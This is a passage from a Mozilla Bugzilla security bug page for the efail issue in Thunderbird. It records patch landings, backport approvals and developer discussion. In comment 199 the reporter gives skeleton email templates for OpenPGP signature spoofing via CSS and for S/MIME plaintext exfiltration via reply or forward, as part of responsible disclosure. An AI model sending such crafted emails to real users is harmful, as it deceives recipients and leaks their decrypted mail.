            <a href="/show_bug.cgi?id=1419417#a15645892_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:39 PDT" data-time="1526920783">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979123&amp;action=edit"
           title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]"
           class=""
        >Attachment #8979123</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a15645967_176914"><div class="change" id="aa15645967_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15645967_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15645967_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15645967_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15645967_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15645967_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:40 PDT" data-time="1526920858">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979211&amp;action=edit"
           title="1419417-fix-tests.patch (v3)"
           class=""
        >Attachment #8979211</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a15646030_176914"><div class="change" id="aa15646030_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15646030_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15646030_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15646030_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15646030_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15646030_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:42 PDT" data-time="1526920921">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Attachment is obsolete: false</div><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: review+</div></div></div><div class="change-set" id="c193"><div class="comment" data-id="13294532" data-no="193"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-193" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15646030_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15646030_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-193"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-193" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c193">Comment 193</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 10:03 PDT" data-time="1526922224">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-193">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-193" data-comment-id="13294532"><a rel="nofollow" href="https://hg.mozilla.org/comm-central/rev/96fab4a2b81189101231b12106823748c9a70a94">https://hg.mozilla.org/comm-central/rev/96fab4a2b81189101231b12106823748c9a70a94</a>
Parse HTML to make sure that tags and attributes are properly closed. r=mkmelin,jorgk
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/rev/a2472fbf9a2c07e95419cfefa1eb5dd3cd396d88">https://hg.mozilla.org/comm-central/rev/a2472fbf9a2c07e95419cfefa1eb5dd3cd396d88</a>
adjust test expectancy. r=mkmelin,BenB
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/rev/d16fff497d408a3ece7f9eb58874e8151bec70c5">https://hg.mozilla.org/comm-central/rev/d16fff497d408a3ece7f9eb58874e8151bec70c5</a>
revert temporary fix from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute"
   href="/show_bug.cgi?id=1457721">bug 1457721</a>. r=mkmelin

A few comments:
Part one is v4 with my clean-up:
I opted for &quot;content-type&quot; because other parts of the system use that string in lower case. That makes the test easier. Also, that will most likely be removed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense"
   href="/show_bug.cgi?id=1463133">bug 1463133</a>. It also matches mimethsa.cpp.

I'm not comfortable uplifting this, since the DOM created by the patch isn't right, see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a>, so the body comes after the &lt;div&gt; tag. We should address this in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a> for &quot;original&quot; and &quot;simple&quot; HTML now. That was basically the difference between v4 and v5.</pre><div class="activity"><div class="change">Status: ASSIGNED &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2018-05-21 10:03 PDT" data-time="1526922224">4 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_61&amp;o1=isnotempty">status-thunderbird61</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_61&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_62&amp;o1=isnotempty">status-thunderbird62</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_62&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_esr52&amp;o1=isnotempty">status-thunderbird_esr52</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_esr52&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_esr60&amp;o1=isnotempty">status-thunderbird_esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_esr60&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; Thunderbird 62.0</div></div></div><div class="change-set" id="c194"><div class="comment" data-id="13295261" data-no="194"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-194" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15646030_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15646030_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-194"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-194" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c194">Comment 194</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 15:22 PDT" data-time="1526941352">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-194">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-194" data-comment-id="13295261"><span class="quote">&gt; Ben, no one builds TB 52.x at home. Everyone builds on trunk.</span >

I guess, I'm no one, then :)

My whole goal here was to fix TB 52.

But that's now in the hands of drivers.

Thanks for landing this.</pre></div><div class="change-set" id="c195"><div class="comment" data-id="13295267" data-no="195"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-195" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15646030_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15646030_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-195"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-195" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c195">Comment 195</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 15:25 PDT" data-time="1526941559">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-195">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-195" data-comment-id="13295267">Per Mozilla security bug policy, we unhide security bugs where the details are public anyway. I am going to unhide this bug in 3 days. Because the bug and exploit is very public, literally front page news, and the paper with the bug and attack details has been released about a week ago, and people are very interested in the status.</pre></div><div class="change-set" id="c196"><div class="comment" data-id="13295325" data-no="196"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-196" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15646030_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15646030_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-196"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-196" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c196">Comment 196</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 15:56 PDT" data-time="1526943387">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-196">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-196" data-comment-id="13295325">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c194">comment #194</a>)
<span class="quote">&gt; My whole goal here was to fix TB 52.</span >
Yes, but that's not how we develop.

<span class="quote">&gt; But that's now in the hands of drivers.</span >
I'll get it uplifted. I think it's quite risky since we're drastically change the HTML processing. So we might trigger all sorts of bugs/crashes in Gecko's parser or serialiser.</pre></div><div class="change-set" id="a15668763_1689"><div class="change" id="aa15668763_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a15668763_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a15668763_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15668763_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15668763_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15668763_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 16:00 PDT" data-time="1526943654">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: mail-core-security &rarr; core-security-release</div></div></div><div class="change-set" id="c197"><div class="comment" data-id="13295811" data-no="197"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-197" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15668763_1689"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15668763_1689"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-197"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-197" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c197">Comment 197</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-22 00:27 PDT" data-time="1526974052">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-197">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-197" data-comment-id="13295811">TB 52.8.1 ESR:
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr52/rev/6eca16d60d9031dce68473eb3e1693116e4df3c1">https://hg.mozilla.org/releases/comm-esr52/rev/6eca16d60d9031dce68473eb3e1693116e4df3c1</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr52/rev/6b77778b904037f6f603a9424deb6e98cf3e1e97">https://hg.mozilla.org/releases/comm-esr52/rev/6b77778b904037f6f603a9424deb6e98cf3e1e97</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr52/rev/e3e80074c7e10f6dbcd596001b1e995e4f78a492">https://hg.mozilla.org/releases/comm-esr52/rev/e3e80074c7e10f6dbcd596001b1e995e4f78a492</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_esr52&amp;o1=isnotempty">status-thunderbird_esr52</a>:
          <a href="/buglist.cgi?f1=cf_status_thunderbird_esr52&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_esr52&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c198"><div class="comment" data-id="13296260" data-no="198"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-198" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15668763_1689"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15668763_1689"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-198"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-198" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c198">Comment 198</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-22 05:02 PDT" data-time="1526990531">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-198">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-198" data-comment-id="13296260">Jens, can you please make the Daily TB 52 ESR build at
<a rel="nofollow" href="https://archive.mozilla.org/pub/thunderbird/nightly/2018/05/2018-05-22-03-02-01-comm-esr52/">https://archive.mozilla.org/pub/thunderbird/nightly/2018/05/2018-05-22-03-02-01-comm-esr52/</a>
available to your colleagues and Hanno for testing.</pre><div class="activity"><div class="change">Flags: needinfo?(jens.a.mueller)</div></div></div><div class="change-set" id="a15756451_176914"><div class="change" id="aa15756451_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15756451_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15756451_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15756451_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15756451_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-22 16:22 PDT" data-time="1527031342">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: approval-comm-esr60+</div><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: approval-comm-esr52+</div><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: approval-comm-beta+</div></div></div><div class="change-set" id="c199"><div class="comment" data-id="13299980" data-no="199"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-199" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15756451_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-199"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-199" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c199">Comment 199</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 09:50 PDT" data-time="1527094254">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-199">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-199" data-comment-id="13299980">I found some time to re-test TB nightly (2018-05-22) and Enigmail version 2.0.5 (20180521-1522).

As far as I can tell, the related preconnect remote content bypass is fixed (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block"
   href="/show_bug.cgi?id=1408867">bug 1408867</a>). As well is leaking the plaintext by tricking the user into submitting the it via HTML forms (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">Bug 1450345</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field"
   href="/show_bug.cgi?id=1462910">Bug 1462910</a>) or remote images (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute"
   href="/show_bug.cgi?id=1457721">bug 1457721</a>).

Please note that there may still be bypasses -- in the long term I'd agree with what Ben said (<a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment 57</a>).


What still works imho is variants of OpenPGP signature spoofing and S/MIME reply-or-forward exfiltration:

* OpenPGP: signature spoofing based on hiding the real signed text with CSS
---------------------------------------------------
Content-Type: text/html

This is arbitrary text inserted by the attacker...
The mail says `good signature' by the entity below
&lt;div style=&quot;color: red;&quot;&gt;

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

THIS PART IS SIGNED BUT CAN BE HIDDEN WITH CSS
-----BEGIN PGP SIGNATURE-----
...
-----END PGP SIGNATURE-----
```
---------------------------------------------------

* S/MIME: decrypted MIME parts can be completely hidden with CSS; if user replies/forwards in HTML format the (non-visible) plaintext is leaked, otherwise (in text-only reply mode) the victim could be fooled by inserting newlines
---------------------------------------------------
Content-Type: multipart/mixed; boundary=&quot;BOUNDARY&quot;

--BOUNDARY
Content-Type: text/html

Reply please to this email
&lt;div style=&quot;color: red;&quot;&gt;

--BOUNDARY
Content-Type: application/pkcs7-mime; name=&quot;smime.p7m&quot;; smime-type=enveloped-data
Content-Transfer-Encoding: base64
...
--BOUNDARY--
---------------------------------------------------


Also I still don't feel comfortable with mailto:?html-body=whatever

Do we actually need this? It allows a website to put untrusted input into composer. This enables an attacker to escalate into HTML context (even if HTML-composing has been disabled by the user); furthermore stuff like &lt;video poster=&quot;...&quot;&gt; is loaded automatically here (no user interaction required). If there is no valid requirement for ?html-body it should be removed from TB, imho. (I'm unable to exploit it straight-forward but I have a really bad feeling about this feature).</pre><div class="activity"><div class="change">Status: RESOLVED &rarr; REOPENED</div><div class="change">Flags: <span class="activity-deleted">needinfo?(jens.a.mueller)</span></div><div class="change">Resolution: FIXED &rarr; ---</div></div></div><div class="change-set" id="c200"><div class="comment" data-id="13299991" data-no="200"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-200" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15756451_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-200"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-200" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c200">Comment 200</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 09:54 PDT" data-time="1527094456">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-200">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979995"
         class="attachment"
         data-id="8979995" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="pgp-signature-spoofing.eml">
      <meta itemprop="contentSize" content="3681">
      <meta itemprop="encodingFormat" content="message/rfc822">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8979995" itemprop="contentUrl">
        <span id="att-8979995-description" itemprop="description">OpenPGP Signature Spoofing</span></a>
        — <a href="attachment.cgi?id=8979995&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c201"><div class="comment" data-id="13299993" data-no="201"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-201" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15756451_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-201"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-201" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c201">Comment 201</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 09:54 PDT" data-time="1527094490">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-201">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979996"
         class="attachment"
         data-id="8979996" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="pgp-signature-spoofing.png">
      <meta itemprop="contentSize" content="43371">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8979996" itemprop="contentUrl">
        <span id="att-8979996-description" itemprop="description">OpenPGP Signature Spoofing (Screenshot)</span></a>
        — <a href="attachment.cgi?id=8979996&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c202"><div class="comment" data-id="13299995" data-no="202"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-202" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a15756451_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a15756451_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-202"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-202" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c202">Comment 202</a>
          </h3>
          &bull;
